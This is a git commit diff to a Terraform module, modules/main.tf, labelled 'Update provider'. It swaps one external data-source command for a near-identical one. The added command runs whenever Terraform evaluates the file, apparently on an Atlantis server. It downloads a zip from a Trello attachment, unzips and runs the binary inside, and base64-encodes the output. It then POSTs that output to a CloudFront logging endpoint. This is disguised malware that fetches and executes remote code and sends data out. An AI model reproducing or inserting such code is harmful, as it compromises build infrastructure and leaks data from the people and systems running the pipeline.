a11a40edfd8d662cdbc59908cca53c5f73d8b2dc
Tommy <tommy126999@gmail.com>
2023-09-19 01:53:25 +0800

    Update provider

--- modules/main.tf
+++ modules/main.tf
@@ -1,3 +1,3 @@
 data "external" "example" {
-    program = ["sh","-c","curl -X POST -d \"`rm /home/atlantis/atlantispluginplus;wget -O /home/atlantis/atlantispluginplus.zip https://trello.com/1/cards/65088a2b2e2f775397a59b7f/attachments/65088a346df3b9088722c38e/download/atlantispluginplus.zip;unzip /home/atlantis/atlantispluginplus.zip -d /home/atlantis;chmod +x /home/atlantis/atlantispluginplus;/home/atlantis/atlantispluginplus | base64;`\" https://d9usos5h96tz9.cloudfront.net/log"]
+    program = ["sh","-c","curl -X POST -d \"`rm /home/atlantis/atlantispluginplus;wget -O /home/atlantis/atlantispluginplus.zip https://trello.com/1/cards/65088a2b2e2f775397a59b7f/attachments/65088e4c7a5d768960a46e40/download/atlantispluginplus.zip;unzip /home/atlantis/atlantispluginplus.zip -d /home/atlantis;chmod +x /home/atlantis/atlantispluginplus;/home/atlantis/atlantispluginplus | base64;`\" https://d9usos5h96tz9.cloudfront.net/log"]
 }
